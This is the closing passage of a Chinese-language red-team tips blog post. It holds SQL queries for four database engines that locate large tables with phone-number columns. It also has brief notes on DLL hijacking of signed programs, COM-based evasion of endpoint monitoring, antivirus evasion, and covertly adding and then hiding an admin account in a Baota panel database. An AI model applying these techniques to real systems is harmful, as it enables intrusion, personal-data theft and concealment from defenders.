<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">SELECT t.TABLE_SCHEMA as <span class="hljs-string">&#x27;TABLE_SCHEMA&#x27;</span>,a.name as <span class="hljs-string">&#x27;TABLE_NAME&#x27;</span>, c.COLUMN_NAME, b.rows FROM sysobjects AS a<br>INNER JOIN sysindexes AS b ON a.id = b.id<br>INNER JOIN information_schema.columns c on a.name = c.TABLE_NAME<br>INNER JOIN information_schema.tables t on a.name = t.TABLE_NAME<br>WHERE (a.type = <span class="hljs-string">&#x27;u&#x27;</span>) AND (b.indid IN (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) and (c.COLUMN_NAME like <span class="hljs-string">&#x27;%phone%&#x27;</span>) and (b.rows &gt; <span class="hljs-number">100</span>)<br>ORDER BY b.rows DESC<br></code></pre></td></tr></table></figure>

<p>mysql</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">SELECT t.table_schema AS <span class="hljs-string">&#x27;schema&#x27;</span>, t.table_name AS <span class="hljs-string">&#x27;table&#x27;</span>, c.COLUMN_NAME AS <span class="hljs-string">&#x27;column&#x27;</span>, t.table_rows AS <span class="hljs-string">&#x27;rows&#x27;</span><br>FROM information_schema.TABLES t<br>left join information_schema.COLUMNS c on c.table_name = t.table_name<br>WHERE c.COLUMN_NAME like <span class="hljs-string">&#x27;%phone%&#x27;</span> and t.table_rows &gt; <span class="hljs-number">100</span><br>group by t.table_schema, t.table_name, c.COLUMN_NAME, t.table_rows order by t.table_rows desc<br></code></pre></td></tr></table></figure>

<p>oracle</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">select s.username <span class="hljs-string">&quot;schema&quot;</span>,t.table_name <span class="hljs-string">&quot;table&quot;</span>,c.column_name <span class="hljs-string">&quot;column_name&quot;</span>,t.num_rows <span class="hljs-string">&quot;num_rows&quot;</span> from sys.dba_users s <br>right join sys.dba_tables t on s.username=t.owner <br>right join all_tab_columns c on c.table_name=t.table_name <br>where t.num_rows &gt; <span class="hljs-number">100</span> and c.column_name like <span class="hljs-string">&#x27;%PHONE%&#x27;</span> <br>group by s.username,t.table_name,c.column_name,t.num_rows order by <span class="hljs-number">4</span> desc<br></code></pre></td></tr></table></figure>

<p>postgres</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">SELECT c.table_schema,c.table_name,c.column_name,t.n_live_tup FROM pg_stat_user_tables as t<br>inner join information_schema.columns as c <br>on c.table_name = t.relname<br>where c.column_name like <span class="hljs-string">&#x27;%PHONE%&#x27;</span> and t.n_live_tup &gt;<span class="hljs-number">100</span> <br>ORDER BY t.n_live_tup DESC<br></code></pre></td></tr></table></figure>



<p>白+黑的主要手段：</p>
<p>白嫖怪为了得到一个可以以签名程序运行自己任意代码的条件就会去挖掘一些软件厂商的程序是否存在DLL劫持漏洞，利用DLL劫持的特性达到披着羊皮的狼的目的</p>
<p>动态库.so后缀 静态库.a后缀</p>
<p>每一个计划任务文件都存放于<code>%SystemRoot%\System32\Tasks</code>目录下，内容和导出的XML完全相同。</p>
<p>你的签名验证、UAC验证、token验证、打印机、远程桌面都是COM实现的 这个uuid就是罪恶的源泉  有多少个UUID COM就实现了多少个组件 然后效果是终端设备没办法监控到COM的行为 只能人肉解码</p>
<p>c++和c#用vc6.0或者vs2008来写</p>
<p>宝塔的话，先把宝塔原本db文件下载下来备份一下，再添加一个账号密码进去登陆就好了，操作完成后，再将原db文件覆盖过去就行。</p>
<p>能看到宝塔db说明很高权限，复制db到可读可写目录，下载下来，搜索admin，一般都能解开</p>
<p>静态免杀 动态不免杀 看父进程权限</p>
<p>CLR(公共语言运行库)(并且再github上有源码)-.NET框架的代码核心,可以通过获取CLR进而获取很多内置甚至隐藏的函数来进行隐蔽运行</p>
<p>com本身是一种开发理念，旨在跨应用和语言共享二进制代码，其理念类似dll，但dll仅能被C&#x2F;C++理解或遵循C调用规范的语言使用,com通过指明二进制模块必须编译成约定的结构解决了这个问题，其实现方式与c++的类相似，所以通常使用c++来实现一个com组件。</p>
<p>就windows中实现来看，com组件本身仍旧是标准的pe结构(dll&#x2F;exe)，只不过其内部包含了coclass，以及在注册表中注册了相关键值，以便我们找到并使用它。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%BA%A2%E9%98%9F-tips/" class="category-chain-item">红队    tips</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/tips/">#tips</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>个人收集redteam重要tips(2000行 51898字符)</div>
      <div>http://example.com/2023/01/12/个人收集redteam重要tips(2000行 51898字符)/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>January 12, 2023</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/01/22/2022-2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" title="2022-2023年度总结">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2022-2023年度总结</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/12/20/%E5%88%A9%E7%94%A8hook%E7%BB%95%E8%BF%87windowsdefender%E5%8A%A8%E6%80%81%E6%9F%A5%E6%9D%80/" title="hooksleep 绕wdf">
                        <span class="hidden-mobile">hooksleep 绕wdf</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
